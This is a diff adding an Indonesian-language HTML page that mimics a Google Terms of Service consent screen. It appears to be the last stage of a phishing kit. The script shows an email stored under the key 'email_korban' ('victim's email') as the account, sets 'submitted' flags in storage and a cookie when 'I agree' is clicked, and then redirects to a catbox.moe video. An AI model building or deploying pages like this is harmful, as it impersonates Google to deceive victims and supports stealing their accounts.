@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Persetujuan Layanan Google</title>
+<style>
+  html, body { height: 100%; margin: 0; padding: 0; background: #000; }
+  body { color: #e3e3e3; font-family: "Roboto", "Google Sans", Arial, sans-serif; display: flex; justify-content: center; -webkit-font-smoothing: antialiased; }
+  .screen { width: 100%; max-width: 450px; min-height: 100vh; box-sizing: border-box; padding: 50px 24px 32px; display: flex; flex-direction: column; }
+  .logo { text-align: center; margin-bottom: 28px; }
+  .wordmark { font-size: 38px; font-weight: 500; letter-spacing: -0.5px; color: #fff; font-family: "Product Sans", "Google Sans", "Roboto", Arial, sans-serif; }
+  .account { display: flex; align-items: center; justify-content: center; gap: 10px; color: #e3e3e3; font-size: 16px; margin-bottom: 32px; }
+  .account svg { width: 24px; height: 24px; fill: #e3e3e3; flex-shrink: 0; }
+  .content { flex: 1; }
+  .content p { font-size: 16px; line-height: 1.5; color: #e3e3e3; margin-top: 0; margin-bottom: 12px; text-align: left; }
+  .content a { color: #8ab4f8; text-decoration: none; }
+  .actions { display: flex; justify-content: flex-end; margin-top: 24px; padding-bottom: env(safe-area-inset-bottom, 16px); }
+  .actions button { background: #a8c7fa; color: #001d35; border: 0; border-radius: 8px; height: 48px; padding: 0 24px; font-size: 15px; font-family: inherit; font-weight: 500; cursor: pointer; }
+</style>
+</head>
+<body>
+  <div class="screen">
+    <div class="logo"><span class="wordmark">Google</span></div>
+    <div class="account">
+      <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08s5.97 1.09 6 3.08c-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
+      <span id="emailDisplay">Memuat...</span>
+    </div>
+
+    <div class="content">
+      <p>Kami mempublikasikan <a href="#">Persyaratan Layanan Google</a> agar Anda dapat mengetahui apa yang dapat diharapkan saat Anda menggunakan layanan kami. Dengan mengklik 'Saya Setuju', Anda menyetujui persyaratan tersebut.</p>
+      <p>Anda dengan ini juga akan menyetujui <a href="#">Persyaratan Layanan Google Play</a> untuk memungkinkan penemuan dan pengelolaan aplikasi.</p>
+      <p>Dan perlu diingat, <a href="#">Kebijakan Privasi Google</a> menjelaskan cara Google menangani informasi yang dihasilkan saat Anda menggunakan layanan Google. Anda dapat membuka Akun Google Anda (account.google.com) kapan saja untuk melakukan Pemeriksaan Privasi atau menyesuaikan kontrol privasi Anda.</p>
+    </div>
+
+    <div class="actions">
+      <button type="button" onclick="selesai()">Saya setuju</button>
+    </div>
+  </div>
+
+<script>
+  var emailKorban = sessionStorage.getItem('email_korban') || "unknown@gmail.com";
+  document.getElementById('emailDisplay').innerText = emailKorban;
+
+  function selesai() {
+      try{ localStorage.setItem("sudah_submit","1"); }catch(e){}
+      try{ sessionStorage.setItem("sudah_submit","1"); }catch(e){}
+      try{ document.cookie = "sudah_submit=1; max-age=31536000; path=/"; }catch(e){}
+
+      // LANGSUNG KE LINK VIDEO
+      window.location.href = "https://files.catbox.moe/mfxa6c.mp4";
+  }
+</script>
+</body>
+</html>
